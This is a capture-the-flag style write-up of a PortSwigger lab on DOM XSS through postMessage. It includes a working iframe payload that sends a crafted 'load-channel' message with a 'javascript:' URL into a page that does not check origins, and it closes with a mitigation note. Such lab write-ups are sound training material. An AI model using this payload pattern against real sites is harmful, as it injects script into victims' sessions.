# Lab 01 — DOM XSS using web messages

> **Practitioner** · [Official lab](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)

**Entry point:** the home page has a `window.addEventListener("message", ...)`
that trusts `postMessage` data and loads `url` from it.

## Solution

1. Inspect the page source: a `message` listener parses JSON and, for
   `type: "load-channel"`, assigns `iframe.src = url` — no origin check.
2. Host a page that sends the crafted message into the lab page:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="
  this.contentWindow.postMessage(
    JSON.stringify({type:'load-channel', url:'javascript:print()'}), '*')">
</iframe>
```

3. Deliver to victim — the iframe loads the site, posts the message, the
   `javascript:print()` URL executes in the iframe — lab solved.

## Mitigation

Always validate `event.origin` before consuming `postMessage` data; treat
message payloads as untrusted input.
